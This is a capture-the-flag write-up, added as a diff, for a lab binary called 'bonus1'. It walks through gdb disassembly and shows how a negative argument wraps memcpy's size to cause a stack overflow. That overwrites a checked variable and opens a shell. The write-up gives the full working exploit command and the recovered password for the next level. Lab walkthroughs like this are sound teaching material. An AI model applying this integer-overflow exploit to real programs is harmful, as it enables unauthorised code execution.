@@ -1,0 +1,112 @@
+
+██████╗  ██████╗ ███╗   ██╗██╗   ██╗███████╗     ██╗
+██╔══██╗██╔═══██╗████╗  ██║██║   ██║██╔════╝    ███║
+██████╔╝██║   ██║██╔██╗ ██║██║   ██║███████╗    ╚██║
+██╔══██╗██║   ██║██║╚██╗██║██║   ██║╚════██║     ██║
+██████╔╝╚██████╔╝██║ ╚████║╚██████╔╝███████║     ██║
+╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝     ╚═╝
+
+
+disas main
+
+The program is taking two arguments.
+He is doing some calculations/comparisons on it, and then execute a /bin/sh.
+
+<+84>:	cmpl   $0x574f4c46,0x3c(%esp)
+
+To accede the execl, our number need to be equal to 0x574f4c46 (1464814662).
+Unfortunately, we cannot send this value directly because at the beggining, we have this thing :
+
+<+20>:	call   0x8048360 <atoi@plt>
+// Converting argv[1] to an int
+
+<+25>:	mov    %eax,0x3c(%esp)
+<+29>:	cmpl   $0x9,0x3c(%esp)
+// Comparing our int with 0x9
+
+<+34>:	jle    0x804844f <main+43>
+// If our number is greather than 9, the program exit.
+
+The problematic is the following: 
+How to send a number greather than 9, by-passing this verificaiton ?
+
+call   0x8048320 <memcpy@plt>
+
+There is a call to memcpy. We can try a Buffer overflow on it.
+
+<+47>:	lea    0x0(,%eax,4),%ecx
+Notice the program multiplies our nomber by 4.
+(This is important for the future.)
+
+Check the parameters the memcpy is taking :
+
+-> mov    %ecx,0x8(%esp) // 3rd param = size_t n = Our number multiplied by 4
+-> mov    %edx,0x4(%esp) // 2nd param = src = argv[2]
+-> mov    %eax,(%esp) // 1st param = dst = a random address. We will try the overflow here.
+
+The maximum number of characters we can copy is 36 (9*4):
+
+run 9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+The program exit normally.
+
+It's unsuccessfully not enought to overflow the buffer.
+
+To copy more than 36 characters, we can try to use a negative number.
+Effectively, our number is converted to int but the memcpy is using a size_t (unsigned_int).
+So, we can try to send a negative number because it will be interpreted as a positive number whatever happens.
+
+The multiplication by 4 that the program performs on our value will allow us to exceed the limit of the unsigned_int max and go back to 0.
+
+So we take the UINT_MAX, devide it by 4, then add 1.
+
+4294967295 / 4 = 1073741823 + 1 = 1073741824
+
+Let's try this !
+
+gdb bonus1
+
+// set a breakpoint at memcpy
+b *main+79
+
+run -1073741824 hello
+
+x/x $esp+8
+0x00000000
+
+We have 0 at the third parameter of our <memcpy> function (size_t n).
+
+We will now gradually increase this value to get 100.
+For this, we reduce our base value by 25.
+
+-1073741824 - 25 = -1073741799
+
+run -1073741799 hello
+x/x $esp+8
+0x00000064 = 100
+
+Perfect ! Now we can copy our metasploit pattern (that is 100 characters long).
+We set a breakpoint after the memcpy to see what was copied:
+
+b *main+84
+
+run -1073741799 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+x/x $esp+0x3c
+->0x62413362
+
+We rewrote correctly on 0x3c(%esp), and our offset is 40.
+So we can rewrote 0x3c(%esp) to make it equals to the value compared (0x574f4c46).
+
+We adjust our value to make it equals to 40 (offset) + 4 (value)
+
+44 / 4 = 11
+-1073741824 - 11 = -1073741813
+
+./bonus1 -1073741813 `python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'"`
+
+cd ../bonus2 && cat .pass
+
+|══════════════════════════════════════════════════════════════════|
+| 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245 |
+|══════════════════════════════════════════════════════════════════|
+
